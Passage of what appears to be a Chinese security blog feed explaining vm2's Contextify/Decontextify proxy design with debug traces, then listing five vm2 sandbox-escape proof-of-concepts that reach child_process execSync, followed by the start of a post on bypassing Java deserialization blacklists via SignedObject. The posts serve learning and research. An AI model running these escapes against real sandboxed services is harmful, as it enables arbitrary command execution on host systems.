class="line"><span class="keyword">const</span> &#123;<span class="variable constant_">VM</span>, <span class="title class_">VMScript</span>&#125; = <span class="built_in">require</span>(<span class="string">&#x27;vm2&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> file = <span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/sandbox.js`</span>;</span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> <span class="title class_">VMScript</span>(fs.<span class="title function_">readFileSync</span>(file), file);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">new</span> <span class="title function_">VM</span>().<span class="title function_">run</span>(script));</span><br></pre></td></tr></table></figure><h3 id="contextify-js"><a href="#contextify-js" class="headerlink" title="contextify.js"></a>contextify.js</h3><p>contextify.js实际上是代码片段，定义了一系列变量，主要包括两个核心的对象：Contextify 和 Decontextify。<br>其中Contextify用于在沙盒环境中封装对象，Decontextify用于在沙盒环境外解封对象。</p><p>首先看Contextify，它负责在沙盒内部封装对象，根据对象的不同类型，实现了一系列封装对象的方法：</p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1705223256689-b149e565-43af-4835-b208-c0367cb08c27.png" alt="image.png" style="zoom: 150%;" /><p>先关注Contextify#value，它根据要封装的对象类型，分发给不同的方法去进行对象的封装：<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1705225904950-0a77ba4b-e22a-40c7-9c07-0c7655012737.png" alt="image.png"><br>审计各个方法的代码，可以发现所有的方法最终都会进到Contextify#object，我们直接看Contextify#object。<br>Contextify#object的逻辑是：创建一个proxy对象，封装传入参数的object，并设置对应的handlers（钩子函数)，然后缓存封装好的代理对象，并返回该对象：</p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1705223860031-2239bc09-847c-462d-ab94-c8f466d9addd.png" alt="image.png"></p><p>再看它是如何设置handlers的，它把<code>host.Object.assign(&#123;...&#125;, traps, deepTraps)</code>的输出作为handlers其中省略部分是object函数自己设置的钩子函数，traps和deepTraps则是Contextify#objec函数的caller函数设置的钩子函数，而Object.assign的合并规则默认是参数从右向左覆盖：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 目标对象</span></span><br><span class="line"><span class="keyword">const</span> target = &#123; <span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">2</span> &#125;;</span><br><span class="line"><span class="comment">// 源对象1</span></span><br><span class="line"><span class="keyword">const</span> source1 = &#123; <span class="attr">b</span>: <span class="number">3</span>, <span class="attr">c</span>: <span class="number">4</span> &#125;;</span><br><span class="line"><span class="comment">// 源对象2</span></span><br><span class="line"><span class="keyword">const</span> source2 = &#123; <span class="attr">c</span>: <span class="number">5</span>, <span class="attr">d</span>: <span class="number">6</span> &#125;;</span><br><span class="line"><span class="comment">// 将源对象的属性复制到目标对象</span></span><br><span class="line"><span class="keyword">const</span> result = <span class="title class_">Object</span>.<span class="title function_">assign</span>(target, source1, source2);</span><br><span class="line"><span class="comment">// source1 覆盖 source2</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result);  <span class="comment">// 输出: &#123; a: 1, b: 3, c: 5, d: 6 &#125;</span></span><br></pre></td></tr></table></figure><p>所以钩子函数的优先级是：deepTraps&gt;traps&gt;自定义。<br>再看一下Contextify#object设置的钩子函数，可以发现如果想访问constructor，会返回Object导致无法逃逸：</p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1705225105897-41e34361-13d7-4cdf-9e39-c18a72d69fb4.png" alt="image.png"></p><p>小结：Contextify对象根据待封装对象的类型，调用对应方法进行封装，每个方法最后都会进入到Contextify#object，它返回封装好的代理对象。封装的本质就是给对象套一层代理，代理对象会设置钩子函数来保障安全。</p><p>其次看Decontextify，它负责在沙盒外部解封对象，它同样实现了一系列解封对象的方法：</p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1705230527774-e44d6492-dd3f-4775-a386-31d47f24c61a.png" alt="image.png" style="zoom:150%;" /><p>出于Contextify和Decontextify代码逻辑的对称性，Decontextify只讲一些需要注意的点。<br>首先是Decontextify#object的逻辑，会发现和Contextify#object非常相似，都是把object参数封装成proxy：</p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1705231151951-9b0ef571-ffe1-4854-bb3f-011902f413e5.png" alt="image.png"></p><p>解封为什么还是要封装成proxy？答案在proxy对象的钩子函数的区别上。<br>实际上所谓解封，就是再套一层代理，代理对象的钩子函数变了，使得对代理的安全限制解除了。<br>可以看到，Decontextify的钩子函数，使得访问constructor会返回外部对象host.Object，而不是Object：</p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1705231582400-d2544c74-732f-480e-957c-03540e075f5e.png" alt="image.png"></p><p>小结：Decontextify对象根据待解封对象的类型，调用对应方法进行解封，每个方法最后都会进入到Decontextify#object，它返回解封后的代理对象。解封的本质还是给对象再套一层代理，代理对象会设置钩子函数去除Contextify带来的限制。</p><p>最后再看一下文件末尾，主要是把Buffer封装成代理对象，然后返回定义好的Contextify、Decontextify等对象：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">LocalBuffer</span> = <span class="variable language_">global</span>.<span class="property">Buffer</span> = <span class="title class_">Contextify</span>.<span class="title function_">readonly</span>(host.<span class="property">Buffer</span>, &#123;</span><br><span class="line"><span class="attr">allocUnsafe</span>: <span class="keyword">function</span>(<span class="params">size</span>) &#123; <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">alloc</span>(size) &#125;,</span><br><span class="line"><span class="attr">allocUnsafeSlow</span>: <span class="keyword">function</span>(<span class="params">size</span>) &#123; <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">alloc</span>(size) &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> &#123;</span><br><span class="line"><span class="title class_">Contextify</span>,</span><br><span class="line"><span class="title class_">Decontextify</span>,</span><br><span class="line"><span class="title class_">Buffer</span>: <span class="title class_">LocalBuffer</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h3><p>这里通过调试触发Buffer的钩子函数的代码，更好地理解vm2的封装与解封的思路。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;<span class="variable constant_">VM</span>, <span class="title class_">VMScript</span>&#125; = <span class="built_in">require</span>(<span class="string">&#x27;vm2&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> file = <span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/sandbox.js`</span>;</span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> <span class="title class_">VMScript</span>(fs.<span class="title function_">readFileSync</span>(file), file);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">new</span> <span class="title function_">VM</span>().<span class="title function_">run</span>(script));</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">&quot;&quot;</span>);    <span class="comment">//访问并运行Buffer的from方法，将运行结果赋值给a：触发function hook</span></span><br><span class="line">a.<span class="property">i</span> = <span class="function">() =&gt;</span> &#123;&#125;;             <span class="comment">//将a.i设置成一个函数：触发setter hook</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="property">i</span>);           <span class="comment">//访问对象a的i属性：触发getter hook</span></span><br></pre></td></tr></table></figure><p>首先是沙盒的第一行代码，访问Buffer代理对象的from方法，观察会触发哪些hook。<br>这里最先触发的是Contextify#function#get，先尝试get获取from函数，很好理解。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">object(), contextify.js:326</span><br><span class="line">function(), contextify.js:282</span><br><span class="line">value(), contextify.js:449</span><br><span class="line">get(), contextify.js:313</span><br><span class="line">anonymous(), sandbox.js:1</span><br><span class="line">runInContext(), vm:133</span><br><span class="line">run(), main.js:204</span><br><span class="line">anonymous(), escape.js:5</span><br><span class="line">Module._compile(), loader:1376</span><br><span class="line">Module._extensions..js(), loader:1435</span><br><span class="line">Module.load(), loader:1207</span><br><span class="line">Module._load(), loader:1023</span><br><span class="line">executeUserEntryPoint(), run_main:135</span><br><span class="line">anonymous(), run_main_module:28</span><br></pre></td></tr></table></figure><p>前面提到过，Contextify#value用于分发待封装的对象，这里获取到from方法后，交由Contextify#value分发：<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1705235684569-f6a4e97a-fb50-404d-a774-1e7c04793c7f.png" alt="image.png"><br>由于from是function类型，分发后又回到Contextify#function这个方法中，这里的value已经是from函数了：<img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1705235909837-6aa57ffb-6fbd-40e5-943c-33b73c3ce7ef.png" alt="image.png"></p><p>最后进入Contextify#object，封装并返回from函数的代理对象：</p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1705236261758-9f918e99-da04-4393-9d80-ef862b1ae4bd.png" alt="image.png"></p><p>第二个触发的是Contextify#function#apply，它负责在沙盒中调用函数，这里显然是调用刚取到的from方法。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">apply(), contextify.js:288</span><br><span class="line">anonymous(), sandbox.js:1</span><br><span class="line">runInContext(), vm:133</span><br><span class="line">run(), main.js:204</span><br><span class="line">anonymous(), escape.js:5</span><br><span class="line">Module._compile(), loader:1376</span><br><span class="line">Module._extensions..js(), loader:1435</span><br><span class="line">Module.load(), loader:1207</span><br><span class="line">Module._load(), loader:1023</span><br><span class="line">executeUserEntryPoint(), run_main:135</span><br><span class="line">anonymous(), run_main_module:28</span><br></pre></td></tr></table></figure><p>可以看到，它先对context、args解封，再运行fnc.apply获取函数实际返回结果，最后再对返回结果进行封装：<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1705237355456-2dbb952e-886f-4eaf-861b-507ed4a47998.png" alt="image.png"><br>至此沙盒的第一行代码分析， 可以发现”封装”与”解封”的思想贯穿了整个流程。<br>其次是沙盒的第二行代码，对from函数的返回结果a（代理对象）做set操作，观察会触发哪些hook。<br>这里最先触发的是Contextify#object#set，因为是把匿名函数()&#x3D;&gt;{}赋值给a.i，而a是代理对象。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">object(), contextify.js:120</span><br><span class="line">function(), contextify.js:81</span><br><span class="line">value(), contextify.js:237</span><br><span class="line">set(), contextify.js:345</span><br><span class="line">anonymous(), sandbox.js:2</span><br><span class="line">runInContext(), vm:133</span><br><span class="line">run(), main.js:204</span><br><span class="line">anonymous(), escape.js:5</span><br><span class="line">Module._compile(), loader:1376</span><br><span class="line">Module._extensions..js(), loader:1435</span><br><span class="line">Module.load(), loader:1207</span><br><span class="line">Module._load(), loader:1023</span><br><span class="line">executeUserEntryPoint(), run_main:135</span><br><span class="line">anonymous(), run_main_module:28</span><br></pre></td></tr></table></figure><p>可以看到，代码先对value（匿名函数）解封，然后再赋值给object[key]完成set操作：</p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1705239994240-e0ba6b2e-a931-4240-a0ae-92d082a51415.png" alt="image.png"></p><p>由于value是一个函数，通过Decontextify#value分发，会进入Decontextify#function，注意这里的钩子函数</p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1705242090591-5ab5e393-092b-483d-a49c-8ce3a5694859.png" alt="image.png"><br>最后进入Decontextify#object，对钩子函数进行合并，并返回value的代理对象。<br>这里有个问题，value（匿名函数）并没有封装过，在这里却进行了一次解封才赋值给a.i，而变成了代理对象：</p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1705241164551-38a34575-86c1-4e20-9ba6-92f34ef7b11a.png" alt="image.png"></p><p>注意到Decontextify的顺序，value-&gt;function-&gt;object，function会覆盖object的hook：<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1705242824445-716e030f-b7e9-4165-b597-09a006cc7f18.png" alt="image.png"><br>根据上文，解封过的对象a.i，访问其constructor会触发getter，返回外部对象host.Function：</p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1705242975937-1dfc1a30-1fe2-4e4a-a04a-418fecb1fcd8.png" alt="image.png"></p><p>至此沙盒的第二行代码分析完成，我们发现a.i.constructor&#x3D;&#x3D;&#x3D;host.Function，似乎可以逃逸出去？<br>最后是沙盒的第三行代码，通过打印输出a.i，观察是否可以获取到能逃逸的代理对象a.i。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">value</span>(), contextify.<span class="property">js</span>:<span class="number">417</span></span><br><span class="line"><span class="title function_">get</span>(), contextify.<span class="property">js</span>:<span class="number">271</span></span><br><span class="line"><span class="title function_">anonymous</span>(), sandbox.<span class="property">js</span>:<span class="number">3</span></span><br><span class="line"><span class="title function_">runInContext</span>(), <span class="attr">vm</span>:<span class="number">133</span></span><br><span class="line"><span class="title function_">run</span>(), main.<span class="property">js</span>:<span class="number">204</span></span><br><span class="line"><span class="title function_">anonymous</span>(), <span class="built_in">escape</span>.<span class="property">js</span>:<span class="number">5</span></span><br><span class="line"><span class="title class_">Module</span>.<span class="title function_">_compile</span>(), <span class="attr">loader</span>:<span class="number">1376</span></span><br><span class="line"><span class="title class_">Module</span>.<span class="property">_extensions</span>..<span class="title function_">js</span>(), <span class="attr">loader</span>:<span class="number">1435</span></span><br><span class="line"><span class="title class_">Module</span>.<span class="title function_">load</span>(), <span class="attr">loader</span>:<span class="number">1207</span></span><br><span class="line"><span class="title class_">Module</span>.<span class="title function_">_load</span>(), <span class="attr">loader</span>:<span class="number">1023</span></span><br><span class="line"><span class="title function_">executeUserEntryPoint</span>(), <span class="attr">run_main</span>:<span class="number">135</span></span><br><span class="line"><span class="title function_">anonymous</span>(), <span class="attr">run_main_module</span>:<span class="number">28</span></span><br></pre></td></tr></table></figure><p>这里最先触发的是Contextify#instance#get，显然是我们获取代理对象a的i属性时触发了getter。<br>很遗憾，在这个getter返回时，会先把a.i进行封装，然后再返回，我们无法获取到解封时那个a.i，也就无法逃逸：</p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1705245212290-b9f4bf2a-3d96-4a3b-a944-d4f57f45c824.png" alt="image.png"></p><p>由于value（a.i）在第二行代码运行时保留了缓存，所以直接查询缓存返回：</p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1705245774335-d4778680-a085-440c-8488-c9ffc4094afe.png" alt="image.png"></p><p>至此本示例分析完毕。<br>小结：可以发现，Contextify和Decontextify并不是简单的互补关系，而更像一种覆盖关系，代理对象能否访问外部变量取决于最外层的代理是谁封装的。Contextify使对象无法访问到外部变量，Decontextify使对象可以访问到外部变量。一个对象可以不封装而直接解封，这样它就能直接访问外部变量。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> &#123;<span class="variable constant_">VM</span>, <span class="title class_">VMScript</span>&#125; = <span class="built_in">require</span>(<span class="string">&#x27;vm2&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> file = <span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/sandbox.js`</span>;</span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> <span class="title class_">VMScript</span>(fs.<span class="title function_">readFileSync</span>(file), file);</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">new</span> <span class="title function_">VM</span>().<span class="title function_">run</span>(script));</span><br><span class="line">&#125;<span class="keyword">catch</span> (x)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// poc1</span></span><br><span class="line"><span class="keyword">var</span> process;</span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">has</span>=<span class="function">(<span class="params">t,k</span>)=&gt;</span>&#123;</span><br><span class="line">    process = t.<span class="title function_">constructor</span>(<span class="params"><span class="string">&quot;return process&quot;</span></span>)(<span class="params"></span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="string">&quot;&quot;</span> <span class="keyword">in</span> <span class="title class_">Buffer</span>.<span class="property">from</span>;</span><br><span class="line">process.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">execSync</span>(<span class="string">&quot;whoami&quot;</span>).<span class="title function_">toString</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// poc2</span></span><br><span class="line"><span class="keyword">var</span> process;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(<span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">&quot;&quot;</span>), <span class="string">&quot;&quot;</span>, &#123;<span class="keyword">get</span> <span class="title function_">set</span>()&#123;</span><br><span class="line">            <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>,<span class="string">&quot;get&quot;</span>,&#123;<span class="title function_">get</span>(<span class="params"></span>)&#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="function"><span class="params">x</span>=&gt;</span>x.<span class="title function_">constructor</span>(<span class="params"><span class="string">&quot;return process&quot;</span></span>)(<span class="params"></span>);</span><br><span class="line">                &#125;&#125;);</span><br><span class="line">            <span class="keyword">return</span> <span class="function">()=&gt;</span>&#123;&#125;;</span><br><span class="line">        &#125;&#125;);</span><br><span class="line">&#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">    process = <span class="title function_">e</span>(<span class="function">()=&gt;</span>&#123;&#125;);</span><br><span class="line">&#125;</span><br><span class="line">process.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">execSync</span>(<span class="string">&quot;whoami&quot;</span>).<span class="title function_">toString</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// poc3</span></span><br><span class="line"><span class="keyword">const</span> f = <span class="title class_">Buffer</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">write</span>;</span><br><span class="line"><span class="keyword">const</span> ft = &#123;</span><br><span class="line">    <span class="attr">length</span>: <span class="number">10</span>,</span><br><span class="line">    <span class="title function_">utf8Write</span>(<span class="params"></span>)&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">r</span>(<span class="params">i</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> x = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        x = <span class="title function_">r</span>(i);</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;&#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_">typeof</span>(x)!==<span class="string">&#x27;number&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    <span class="keyword">if</span>(x!==i)</span><br><span class="line">        <span class="keyword">return</span> x+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        f.<span class="title function_">call</span>(ft);</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="keyword">return</span> e;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> i=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        i=<span class="title function_">r</span>(i).<span class="property">constructor</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">&quot;return process&quot;</span></span>)(<span class="params"></span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">i.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">execSync</span>(<span class="string">&quot;whoami&quot;</span>).<span class="title function_">toString</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// poc4</span></span><br><span class="line"><span class="keyword">let</span> res = <span class="keyword">import</span>(<span class="string">&#x27;./foo.js&#x27;</span>)</span><br><span class="line">res.<span class="property">toString</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">&quot;return this&quot;</span></span>)(<span class="params"></span>).<span class="property">process</span>.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">execSync</span>(<span class="string">&quot;whoami&quot;</span>).<span class="title function_">toString</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// poc5 测试未通过，和版本有关。</span></span><br><span class="line"><span class="title class_">Symbol</span> = &#123;</span><br><span class="line">    <span class="keyword">get</span> <span class="title function_">toStringTag</span>()&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="function"><span class="params">f</span>=&gt;</span>f.<span class="title function_">constructor</span>(<span class="params"><span class="string">&quot;return process&quot;</span></span>)(<span class="params"></span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="keyword">new</span> <span class="title class_">Map</span>());</span><br><span class="line">&#125;<span class="keyword">catch</span>(f)&#123;</span><br><span class="line">    <span class="title class_">Symbol</span> = &#123;&#125;;</span><br><span class="line">    <span class="title function_">f</span>(<span class="function">()=&gt;</span>&#123;&#125;).<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">execSync</span>(<span class="string">&quot;whoami&quot;</span>).<span class="title function_">toString</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.anquanke.com/post/id/207283">https://www.anquanke.com/post/id/207283</a><br><a href="https://www.anquanke.com/post/id/207291">https://www.anquanke.com/post/id/207291</a><br><a href="https://xz.aliyun.com/t/11859">https://xz.aliyun.com/t/11859</a><br><a href="https://www.cnblogs.com/zpchcbd/p/16899212.html">https://www.cnblogs.com/zpchcbd/p/16899212.html</a><br>p牛知识星球</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;vm2在2023年7月已经停止维护了，本文仅用作nodejs沙盒逃逸思路的学习。&lt;/p&gt;
&lt;h1 id=&quot;vm&quot;&gt;&lt;a href=&quot;#vm&quot;</summary>
      
    
    
    
    
    <category term="Nodejs" scheme="https://jaspersec.top/tags/Nodejs/"/>
    
    <category term="vm2" scheme="https://jaspersec.top/tags/vm2/"/>
    
  </entry>
  
  <entry>
    <title>Java二次反序列化浅析</title>
    <link href="https://jaspersec.top/posts/1316980488.html"/>
    <id>https://jaspersec.top/posts/1316980488.html</id>
    <published>2023-12-24T06:32:20.000Z</published>
    <updated>2025-03-31T22:09:47.232Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>题目hook resolveClass存在入口类黑名单，就可以用二次反序列化绕过，例如巅峰极客的babyurl。<br>本质是，A类的a方法，内部可以实现反序列化，并且要反序列化的对象我们可控；在B入口类被禁用的情况下，<br>通过把要反序列化的恶意对象b放入A类，用没被禁用的入口类C的readObject，去调用A类的a方法，进而调到B类的readObject，实现绕过黑名单。</p><h1 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h1><h2 id="SignedObject"><a href="#SignedObject" class="headerlink" title="SignedObject"></a>SignedObject</h2><p>SignedObject#getObject会把this.content里的内容反序列化。</p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1700457171324-9456aed4-056b-4fea-bbc6-9275a0652321.png" alt="image.png"></p><p>而this.content在构造函数里可以控制，传入对象会自动序列化，然后写入this.content</p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1700457270551-9446c76a-8ad9-4a93-b181-6a2822fb1699.png" alt="image.png"></p><p>把待反序列化对象传入构造函数，将问题转换成反序列化链调用SignedObject#getObjetct。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">KeyPairGenerator</span> <span class="variable">kpg</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">kpg.initialize(<span class="number">1024</span>);</span><br><span class="line"><span class="type">KeyPair</span> <span class="variable">kp</span> <span class="operator">=</span> 